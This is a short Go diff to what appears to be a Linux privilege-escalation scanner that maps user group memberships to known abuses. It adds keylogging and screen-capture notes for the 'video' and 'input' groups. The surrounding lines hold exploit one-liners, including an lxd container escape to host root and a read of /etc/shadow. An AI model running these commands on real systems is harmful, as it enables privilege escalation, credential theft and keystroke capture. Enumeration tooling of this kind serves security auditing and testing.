@@ -23,6 +23,8 @@ var PrivilegedGroups = map[string]string{
 	"sudo":   "Can execute commands as root (check sudo -l).",
 	"wheel":  "Can execute commands as root (check sudo -l).",
 	"root":   "Is the root group.",
+	"video":  "Can access the framebuffer (/dev/fb*) for keylogging or screen capture.",
+	"input":  "Can read raw input events from /dev/input/* for keylogging.",
 }
 
 var GroupExploits = map[string]string{
@@ -30,6 +32,8 @@ var GroupExploits = map[string]string{
 	"lxd":    "lxc image import alpine.tar.gz --alias alpine; lxc init alpine privesc -c security.privileged=true; lxc config device add privesc hostroot disk source=/ path=/mnt/root; lxc start privesc; lxc exec privesc /bin/sh",
 	"disk":   "debugfs /dev/sda1 (or relevant device) - find sensitive files or write to disk.",
 	"shadow": "cat /etc/shadow | grep root",
+	"video":  "cat /dev/fb0 > screenshot.raw; or use tools like fbtft to capture screen.",
+	"input":  "cat /dev/input/event* (requires root or CAP_INPUT) or use showkey to log keys.",
 }
 
 // ScanGroups checks if the current user belongs to any high-risk groups 
